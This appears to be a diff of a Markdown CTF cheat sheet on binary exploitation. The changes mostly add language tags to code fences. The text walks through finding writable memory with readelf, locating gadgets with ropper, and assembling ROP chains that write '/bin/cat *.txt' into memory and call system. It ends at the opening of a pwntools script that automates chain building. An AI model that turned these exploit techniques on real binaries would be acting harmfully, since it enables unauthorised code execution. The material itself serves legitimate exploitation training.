@@ -57,15 +57,15 @@ PAYLOAD =  offset_padding + pop_rdi_gadget + print_flag + system_address
 ## **Writing in the Stack and executing  ROP (Return Oriented Programming) to pwn a binary**
 
 ◇ Find a place to write by checking for Writeable and Allocatable (WA) memory with enough space! 
-~~~
+~~~bash
 readelf -S binary #[mem_address]
 ~~~
 ◇ Search for the appropriate mov gadget to inject the string into the stack by 
-~~~
+~~~bash
 ropper --file binary --search "mov" #[mov_address]
 ~~~
 ◇ Search for the appropriate pop gadget to inject the string into the stack by 
-~~~
+~~~bash
 ropper --file binary --search "pop" #[pop_address]
 ~~~
 
@@ -106,14 +106,13 @@ We can also use print function and flag_name.txt as argument to cat the flag... 
 	- Writing “ \*.txt” [Adding a space in the front as only “/bin/cat \*.txt” works and “/bin/cat \*.txt" doesnt]
 		- pop_address to clear the registers and then move to the (mem_address+8)[The plus 8 is because the first 8 elements of the memory is already filled by rop1 ] and then write/overwrite it with “ \*.txt\x00\x00” and then move back to RIP using mov_address , so that we can do a sys_call and call “/bin/cat \*.txt”
 
-~~~
-rop2 = pop_address + (mem_address+8) + “ *.txt\x00\x00” + mov_address
-~~~
-
+	~~~
+	rop2 = pop_address + (mem_address+8) + “ *.txt\x00\x00” + mov_address
+	~~~
 
 - Writing the Final Payload after writing “/bin/cat \*.txt” into the stack
 `As it is a 64bit binary we need a pop_rdi gadget to pop RDI and create a fake stack to control the flow of execution, which can be selected from here `
-~~~
+~~~bash
 ropper --file binary --search "pop rdi" #[pop_rdi]
 ~~~
 ~~~
@@ -123,7 +122,7 @@ PAYLOAD = offset_padding + rop1 + rop2 + pop_rdi + mem_address + sys_address
 
 But I am too lazy to make a ROP chain and then append it with the PAYLOAD.....,So i automated the process to create the ropchain,not the finest program,But it WORKS!!! XD >_<
 
-~~~
+~~~python
 from pwn import * #[pip2 install pwntools] because, I personally feel python2 is great for pwning binary
 
 def ropper(mem_addr,pop_addr,mov_addr,sys_addr,string,arch = 32):
